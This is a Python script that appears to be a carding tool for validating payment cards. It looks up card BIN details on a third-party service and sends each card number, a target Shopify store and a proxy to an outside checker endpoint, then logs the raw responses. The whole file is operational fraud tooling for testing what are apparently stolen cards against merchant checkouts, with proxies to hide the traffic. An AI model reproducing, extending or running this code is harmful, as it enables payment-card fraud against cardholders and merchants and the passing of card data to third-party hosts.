import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import requests

CHECK_URL = "https://kamalxd.com/shopify/sh.php"

def lookup_bin(bin_prefix: str) -> dict:
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_prefix}", timeout=15)
        data = res.json()
        if "detail" in data or "error" in data:
            return {}
        return data
    except Exception:
        return {}

def get_session():
    session = requests.Session()
    retries = Retry(total=3,
                    backoff_factor=1,
                    status_forcelist=[502, 503, 504, 522, 524],
                    allowed_methods=False)
    session.mount('https://', HTTPAdapter(max_retries=retries))
    session.mount('http://', HTTPAdapter(max_retries=retries))
    return session

session = get_session()

def check_card(card, site, proxy):
    params = {'cc': card, 'site': f"https://{site}", 'proxy': proxy}
    try:
        resp = session.get(CHECK_URL, params=params, timeout=200)
        print(f"[RAW RESPONSE] Card: {card} | Site {site} | Response: {resp.text[:200]}")
        return resp.text
    except Exception as e:
        print(f"[ERROR] Card: {card} | Exception: {e}")
        return f"Error: {str(e)}"
